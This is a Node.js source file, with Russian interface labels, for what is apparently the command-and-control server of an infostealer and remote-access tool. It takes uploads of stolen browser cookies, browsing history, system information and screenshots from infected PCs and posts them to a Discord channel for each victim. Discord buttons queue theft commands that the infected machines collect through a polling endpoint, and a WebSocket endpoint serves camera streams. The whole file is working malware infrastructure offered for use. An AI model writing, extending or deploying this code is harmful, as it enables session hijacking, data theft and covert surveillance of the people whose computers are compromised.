import express from "express";
import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";
import { WebSocketServer } from "ws";
import http from "http";
import crypto from "crypto";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();
app.use(express.json({ limit: "100mb" }));
app.use(express.static(path.join(__dirname, "public")));

const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;

const CATEGORY_BASE_PC = "Все ПК";
const CATEGORY_BASE_CAM = "Камеры";
const LOG_CATEGORY = "Логи";
const LOG_CHANNEL = "server-logs";

const onlinePCs = {};
const pendingCommands = {};
const pcData = {};
const channelByPC = {};
const wsCameraClients = {};

const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
bot.once("ready", () => console.log(`✅ Бот вошёл как ${bot.user.tag}`));
bot.login(DISCORD_BOT_TOKEN);

function shortHash(s,len=8){ return crypto.createHash('sha1').update(s).digest('hex').slice(0,len); }
function safeChannelName(prefix,id){ return `${prefix}-${shortHash(id,8)}`.toLowerCase().replace(/[^a-z0-9\-]/g,'-').slice(0,90); }

async function getOrCreateCategory(guild,name){
    const channels = await guild.channels.fetch();
    const matches = channels.filter(c=>c.type===ChannelType.GuildCategory && c.name===name);
    if(matches.size>=1) return matches.first();
    return await guild.channels.create({name,type:ChannelType.GuildCategory});
}

async function getOrCreateTextChannel(guild,name,parentId){
    const channels = await guild.channels.fetch();
    const matches = channels.filter(c=>c.type===ChannelType.GuildText && c.name===name && c.parentId===parentId);
    if(matches.size>=1) return matches.first();
    return await guild.channels.create({name,type:ChannelType.GuildText,parent:parentId});
}

function createControlButtons(pcId){
    const safePcId = encodeURIComponent(pcId);
    return [new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`check_online|${safePcId}`).setLabel("Чек онлайн").setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`get_cookies|${safePcId}`).setLabel("Куки").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_history|${safePcId}`).setLabel("История").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_system|${safePcId}`).setLabel("Системная").setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId(`get_screenshot|${safePcId}`).setLabel("Скриншот").setStyle(ButtonStyle.Secondary)
    )];
}

bot.on("interactionCreate", async interaction=>{
    if(!interaction.isButton()) return;
    const [command,encodedPcId] = interaction.customId.split("|");
    const pcId = decodeURIComponent(encodedPcId);
    if(!pendingCommands[pcId]) pendingCommands[pcId] = [];
    pendingCommands[pcId].push(command);
    await interaction.reply({content:`✅ Команда "${command}" отправлена ПК ${pcId}`,ephemeral:true});
});

// ---------- Upload PC ----------
app.post("/upload-pc", async (req,res)=>{
    try{
        const { pcId, cookies, history, systemInfo, screenshot } = req.body;
        if(!pcId) return res.status(400).json({ error:"pcId required" });

        onlinePCs[pcId] = Date.now();
        pcData[pcId] = { cookies, history, systemInfo, screenshot };

        const guild = await bot.guilds.fetch(GUILD_ID);
        const category = await getOrCreateCategory(guild, CATEGORY_BASE_PC);
        const channelName = safeChannelName('pc', pcId);
        let finalChannel = channelByPC[pcId] ? await guild.channels.fetch(channelByPC[pcId]).catch(()=>null) : null;
        if(!finalChannel){
            finalChannel = await getOrCreateTextChannel(guild, channelName, category.id);
            channelByPC[pcId] = finalChannel.id;
        }

        const files = [];
        if(cookies) files.push({ attachment: Buffer.from(JSON.stringify({cookies},null,2)), name:`${channelName}-cookies.json` });
        if(history) files.push({ attachment: Buffer.from(JSON.stringify({history},null,2)), name:`${channelName}-history.json` });
        if(systemInfo) files.push({ attachment: Buffer.from(JSON.stringify({systemInfo},null,2)), name:`${channelName}-system.json` });
        if(screenshot) files.push({ attachment: Buffer.from(screenshot,"base64"), name:`${channelName}-screenshot.jpeg` });

        const messageOptions = { components:createControlButtons(pcId) };
        if(files.length) messageOptions.files = files; else messageOptions.content = `🟢 ПК ${pcId} обновлён`;
        await finalChannel.send(messageOptions);

        res.json({ success:true });
    }catch(e){ console.error("Ошибка upload-pc:", e); res.status(500).json({ error:e.message }); }
});

// ---------- Ping ----------
app.post("/ping",(req,res)=>{
    const { pcId } = req.body;
    if(!pcId) return res.status(400).json({ error:"pcId required" });
    onlinePCs[pcId] = Date.now();
    const commands = pendingCommands[pcId] || [];
    pendingCommands[pcId] = [];
    res.json({ commands });
});

// ---------- WebSocket ----------
const wss = new WebSocketServer({ noServer:true });
wss.on("connection",(ws,req)=>{
    const url = new URL(req.url, `http://${req.headers.host}`);
    const camId = url.searchParams.get("camId") || "all";
    if(!wsCameraClients[camId]) wsCameraClients[camId] = [];
    wsCameraClients[camId].push(ws);
    ws.on("close",()=>{ wsCameraClients[camId] = wsCameraClients[camId].filter(c=>c!==ws); });
});

// ---------- Запуск ----------
const server = http.createServer(app);
server.on("upgrade",(req,socket,head)=> wss.handleUpgrade(req,socket,head,ws=>wss.emit("connection",ws,req)));
const PORT = process.env.PORT || 3000;
server.listen(PORT,()=>console.log(`🚀 Сервер слушает порт ${PORT}`));
